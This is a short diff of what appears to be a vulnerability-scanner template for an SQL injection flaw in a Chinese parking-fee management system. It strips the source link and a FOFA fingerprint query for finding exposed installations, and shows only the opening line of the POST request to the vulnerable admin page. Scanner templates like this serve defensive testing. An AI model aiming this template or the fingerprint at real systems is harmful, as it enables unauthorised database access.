@@ -3,12 +3,8 @@ info:
   name: 科拓全智能停车收费系统T_SellFrom.aspx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ruzc5ge73dx92dzh'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ruzc5ge73dx92dzh
-    fofa: body="/Sys/CommonJs/artDialog/skins/simple.css"
 http:
 - raw:
   - 'POST /KT_Admin/SellManage/T_SellFrom.aspx HTTP/1.1
